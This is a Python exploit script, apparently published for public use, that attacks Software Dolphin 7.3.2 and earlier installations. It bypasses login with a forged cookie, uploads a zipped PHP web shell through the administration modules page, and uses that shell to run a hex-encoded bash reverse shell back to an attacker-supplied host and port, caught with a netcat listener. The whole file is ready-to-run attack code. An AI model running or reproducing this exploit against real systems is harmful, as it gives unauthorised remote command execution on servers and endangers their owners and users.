# Software Dolphin <= 7.3.2 Auth bypass / RCE exploit
# (m4ud)
# Auth bypass trick credit go to Saadat Ullah

import requests
import os
import subprocess
import sys
import binascii
from urllib.parse import quote_plus
import time

target = sys.argv[1]
lhost = sys.argv[2]
lport = sys.argv[3]

if len(sys.argv) <= 3:
    print("Usage: ./expoit.py targetIP LHOST LPORT")
    exit()

url = "http://" + target
upload_path = '/dolphin2/administration/modules.php'

filename = "0xm4ud.zip"
payload = "<?php system($_REQUEST['m4ud']); ?>"
f = open( '0xm4ud.php', 'w' )
f.write(payload)
f.close()
#os.system('zip 0xm4ud.zip 0xm4ud.php')
subprocess.Popen(["zip", "0xm4ud.zip", "0xm4ud.php", "-qq"])
shell = "bash -i >&/dev/tcp/%s/%s 0>&1" % (lhost, lport)
v = binascii.hexlify(bytes(shell, encoding='utf-8'))
payload = "echo " + str(v, encoding='utf-8') + "|xxd -p -r|bash"
time.sleep(1)
def upload(url, filename):
	print("\r\n(m4ud) Magnificent Dolphin2 File Uploader to RCE")
	headers = { 'Cookie': "memberID=1; memberPassword[]=0xm4ud;"}
	files = {'module': (filename, open(filename, 'rb'), 'application/zip')}
	datas = {
		'submit_upload':(None, 'm4ud'),
		'csrf_token':(None, 'Still dont care about csrf')
}
	r = requests.post(url + upload_path, data=datas,
			files=files, headers=headers, verify=False)
	os.system("rm 0xm4ud.* 2>/dev/null")
	r = requests.get(url + "/dolphin2/tmp/0xm4ud.php")
	if not r.ok:
		print("[-] Upload has failed ! [-]")
	else:
		print("\r\n[+] 0xm4ud.php has been successfully uploaded! [+]\r\n")
		print("[*] Spawning shell [*]")
		f = subprocess.Popen(["nc", "-lvnp", str(lport)])
		r = requests.get(url + "/dolphin2/tmp/0xm4ud.php?m4ud=" + quote_plus(payload))
		f.communicate()
upload(url, filename)

